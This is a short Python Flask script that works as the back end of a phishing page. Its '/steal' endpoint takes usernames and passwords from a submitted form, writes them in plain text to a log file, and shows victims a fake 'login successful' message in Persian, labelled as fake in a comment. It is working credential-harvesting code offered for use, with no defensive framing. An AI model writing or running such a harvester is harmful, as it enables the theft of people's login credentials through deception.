from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open("log.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    
    return "ورود با موفقیت انجام شد!"  # پیام جعلی

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
